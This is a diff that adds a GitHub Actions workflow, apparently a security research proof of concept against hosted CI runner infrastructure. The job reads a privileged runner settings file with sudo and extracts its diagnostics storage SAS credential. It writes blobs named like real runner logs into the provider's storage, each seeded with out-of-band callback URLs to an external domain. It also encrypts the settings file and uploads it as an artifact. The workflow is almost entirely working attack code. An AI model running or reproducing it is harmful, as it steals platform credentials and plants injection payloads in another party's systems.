@@ -1,0 +1,180 @@
+name: f004-diagnostics-post-completion
+
+on:
+  workflow_dispatch:
+    inputs:
+      oast_domain:
+        description: OAST base domain used for controlled callback labels
+        required: true
+        type: string
+
+permissions:
+  contents: read
+
+jobs:
+  seed-producer-shaped-blobs:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    env:
+      F004_CAPTURE_CERT: ${{ secrets.F004_CAPTURE_CERT }}
+      F004_OAST_DOMAIN: ${{ inputs.oast_domain }}
+    steps:
+      - name: Seed exact diagnostics producer shapes
+        shell: bash
+        run: |
+          set -euo pipefail
+          umask 077
+          test -n "$F004_CAPTURE_CERT"
+          [[ "$F004_OAST_DOMAIN" =~ ^[A-Za-z0-9.-]+$ ]]
+
+          raw="$RUNNER_TEMP/f004-diagnostics-raw"
+          sealed="$RUNNER_TEMP/f004-diagnostics-sealed"
+          mkdir -p "$raw" "$sealed"
+          sudo cp /opt/hca/.settings "$raw/settings.json"
+          sudo chown "$USER:$USER" "$raw/settings.json"
+
+          runner_log_name=$(sudo find /home/runner -type f -path '*/_diag/*.log' \
+            -printf '%f\n' 2>/dev/null | sort | head -1 || true)
+          if [[ -z "$runner_log_name" ]]; then
+            runner_log_name="Runner_$(date -u '+%s').log"
+          fi
+          export F004_RUNNER_LOG_NAME="$runner_log_name"
+
+          python3 - "$raw/settings.json" "$sealed/results.json" <<'PY'
+          import datetime
+          import hashlib
+          import json
+          import os
+          import pathlib
+          import secrets
+          import time
+          import urllib.error
+          import urllib.parse
+          import urllib.request
+
+          settings_path = pathlib.Path(os.sys.argv[1])
+          output_path = pathlib.Path(os.sys.argv[2])
+          settings = json.loads(settings_path.read_text())
+          sas_uri = settings['diagnosticsSasUri']
+          parsed = urllib.parse.urlsplit(sas_uri)
+          if parsed.scheme != 'https' or not parsed.hostname:
+              raise SystemExit('diagnostics SAS did not use an HTTPS origin')
+
+          query = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
+          permissions = ''.join(query.get('sp', ['']))
+          if not {'a', 'c', 'w'}.issubset(set(permissions)):
+              raise SystemExit('diagnostics SAS lacked expected add/create/write permissions')
+
+          oast_domain = os.environ['F004_OAST_DOMAIN'].strip().lower()
+          run_id = os.environ['GITHUB_RUN_ID']
+          nonce = secrets.token_hex(4)
+          folder_epoch = int(time.time())
+          time.sleep(2)
+          summary_epoch = int(time.time())
+          runner_log_name = pathlib.PurePath(os.environ['F004_RUNNER_LOG_NAME']).name
+          probes = [
+              ('nested-diag', f'vm-logs-{folder_epoch}/diag_{summary_epoch}.log'),
+              ('nested-runner', f'vm-logs-{folder_epoch}/{runner_log_name}'),
+              ('root-diag', f'diag_{summary_epoch}.log'),
+              ('random-control', f'f004-control-{run_id}-{nonce}.txt'),
+          ]
+
+          results = []
+          for label, blob_name in probes:
+              callback_label = f'f004-{label}-{run_id}-{nonce}'
+              callback_host = f'{callback_label}.{oast_domain}'
+              correlation = f'F004-DIAGNOSTICS-{label.upper()}-{run_id}-{nonce}'
+              seeded_at = datetime.datetime.now(datetime.timezone.utc).isoformat()
+              payload = (
+                  f'timestamp={seeded_at}\n'
+                  f'source_correlation_id={correlation}\n'
+                  f'reference=http://{callback_host}/plain\n'
+                  f'json={{"callback_url":"http://{callback_host}/json"}}\n'
+                  f'markdown=![](http://{callback_host}/markdown)\n'
+                  f'xml=<probe href="http://{callback_host}/xml"/>\n'
+              ).encode()
+              blob_path = parsed.path.rstrip('/') + '/' + urllib.parse.quote(blob_name, safe='/')
+              url = urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, blob_path, parsed.query, ''))
+              request = urllib.request.Request(
+                  url,
+                  data=payload,
+                  method='PUT',
+                  headers={
+                      'Content-Type': 'text/plain',
+                      'If-None-Match': '*',
+                      'x-ms-blob-type': 'BlockBlob',
+                  },
+              )
+              status = 0
+              etag = ''
+              error_code = ''
+              response_sha256 = hashlib.sha256(b'').hexdigest()
+              try:
+                  with urllib.request.urlopen(request, timeout=30) as response:
+                      response_body = response.read()
+                      status = response.status
+                      etag = response.headers.get('ETag', '')
+                      error_code = response.headers.get('x-ms-error-code', '')
+                      response_sha256 = hashlib.sha256(response_body).hexdigest()
+              except urllib.error.HTTPError as error:
+                  response_body = error.read()
+                  status = error.code
+                  etag = error.headers.get('ETag', '')
+                  error_code = error.headers.get('x-ms-error-code', '')
+                  response_sha256 = hashlib.sha256(response_body).hexdigest()
+              results.append({
+                  'label': label,
+                  'blob_name': blob_name,
+                  'callback_label': callback_label,
+                  'seeded_at': seeded_at,
+                  'status': status,
+                  'etag': etag,
+                  'error_code': error_code,
+                  'payload_sha256': hashlib.sha256(payload).hexdigest(),
+                  'response_sha256': response_sha256,
+              })
+
+          report = {
+              'repository': os.environ['GITHUB_REPOSITORY'],
+              'run_id': run_id,
+              'run_attempt': os.environ['GITHUB_RUN_ATTEMPT'],
+              'job': os.environ['GITHUB_JOB'],
+              'runner_name': os.environ['RUNNER_NAME'],
+              'seed_completed_at': datetime.datetime.now(datetime.timezone.utc).isoformat(),
+              'sas_origin': f'{parsed.scheme}://{parsed.netloc}',
+              'signed_container_path_sha256': hashlib.sha256(parsed.path.encode()).hexdigest(),
+              'sas_permissions': permissions,
+              'sas_expiry': query.get('se', [''])[0],
+              'folder_epoch': folder_epoch,
+              'summary_epoch': summary_epoch,
+              'settings_sha256': hashlib.sha256(settings_path.read_bytes()).hexdigest(),
+              'results': results,
+          }
+          output_path.write_text(json.dumps(report, indent=2) + '\n')
+          if not all(item['status'] == 201 and item['etag'] for item in results):
+              raise SystemExit('one or more controlled blob seeds failed')
+          print(json.dumps(report, indent=2))
+          PY
+
+          printf '%s\n' "$F004_CAPTURE_CERT" > "$RUNNER_TEMP/f004-certificate.pem"
+          openssl cms -encrypt -binary -aes-256-cbc \
+            -in "$raw/settings.json" \
+            -outform DER \
+            -out "$sealed/settings.cms" \
+            "$RUNNER_TEMP/f004-certificate.pem"
+          shasum -a 256 "$sealed/settings.cms" | awk '{print $1}' > "$sealed/settings.cms.sha256"
+          shred -u "$RUNNER_TEMP/f004-certificate.pem" "$raw/settings.json"
+          rmdir "$raw"
+
+      - name: Upload sanitized results and encrypted settings
+        uses: actions/upload-artifact@v4
+        with:
+          name: f004-diagnostics-post-completion-${{ github.run_id }}
+          path: ${{ runner.temp }}/f004-diagnostics-sealed
+          retention-days: 1
+          compression-level: 0
+
+      - name: Mark end of attacker-controlled job code
+        shell: bash
+        run: |
+          printf 'job_code_ended_at=%s\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')"
